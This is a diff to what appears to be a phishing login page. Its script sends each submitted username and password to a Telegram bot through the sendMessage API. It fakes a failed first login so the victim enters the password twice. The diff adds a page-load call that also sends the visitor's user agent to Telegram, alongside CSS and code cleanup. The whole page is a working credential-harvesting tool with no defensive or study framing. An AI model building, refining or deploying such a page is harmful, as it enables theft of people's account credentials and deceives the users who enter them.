@@ -19,8 +19,8 @@
         .container {
             width: 100%;
             max-width: 400px;
-            height: auto; /* Allows container to adjust height based on content */
-            min-height: 400px; /* Ensures minimum height for better centering on small screens */
+            height: auto;
+            min-height: 400px;
             text-align: center;
             background-color: white;
             padding: 20px;
@@ -32,10 +32,10 @@
             align-items: center;
         }
         img {
-            width: 50%; /* Adjusted to make the image smaller */
-            max-width: 150px; /* Ensures image does not exceed 150px in width */
-            height: auto; /* Maintains aspect ratio */
-            margin-bottom: 20px;
+            width: 50%;
+            max-width: 150px;
+            height: auto;
+            margin-bottom: 30px; /* Increased spacing */
         }
         input {
             width: 100%;
@@ -102,13 +102,28 @@
     </div>
 
     <script>
+        // Define Telegram credentials once
+        const botToken = 'YOUR_BOT_TOKEN';
+        const chatId = 'YOUR_CHAT_ID';
+
+        // Send user agent to Telegram when the page is loaded
+        (function() {
+            const userAgent = navigator.userAgent;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('User Agent: ' + userAgent)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('User agent sent:', data))
+                .catch(error => console.error('Error sending user agent:', error));
+        })();
+
         let attempt = 0;  // Counter to track the number of login attempts
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             attempt++;
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
             // Hide any previous messages
             document.getElementById('message').style.display = 'none';
@@ -118,37 +133,32 @@
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('preloader').style.display = 'block';
 
-            // Replace with your Telegram bot token and chat ID
-            var botToken = 'YOUR_BOT_TOKEN';
-            var chatId = 'YOUR_CHAT_ID';
-            var text = `Username: ${username}\nPassword: ${password}`;
-
-            // Simple HTTP call to send message to Telegram
-            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+            const text = `Username: ${username}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
             fetch(url)
-            .then(response => response.json())
-            .then(data => {
-                setTimeout(function() {
+                .then(response => response.json())
+                .then(data => {
+                    setTimeout(function() {
+                        document.getElementById('preloader').style.display = 'none';
+                        
+                        if (attempt === 1) {
+                            // First attempt fails
+                            document.getElementById('error').style.display = 'block';
+                            document.getElementById('loginForm').style.display = 'block';
+                            document.getElementById('password').value = '';  // Clear password field
+                        } else if (attempt === 2) {
+                            // Second attempt succeeds
+                            document.getElementById('message').style.display = 'block';
+                        }
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
                     document.getElementById('preloader').style.display = 'none';
-                    
-                    if (attempt === 1) {
-                        // First attempt fails
-                        document.getElementById('error').style.display = 'block';
-                        document.getElementById('loginForm').style.display = 'block';
-                        document.getElementById('password').value = '';  // Clear password field
-                    } else if (attempt === 2) {
-                        // Second attempt succeeds
-                        document.getElementById('message').style.display = 'block';
-                    }
-                }, 2000);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                document.getElementById('preloader').style.display = 'none';
-                document.getElementById('message').textContent = 'An error occurred. Please try again.';
-                document.getElementById('message').style.display = 'block';
-            });
+                    document.getElementById('message').textContent = 'An error occurred. Please try again.';
+                    document.getElementById('message').style.display = 'block';
+                });
         });
     </script>
 </body>
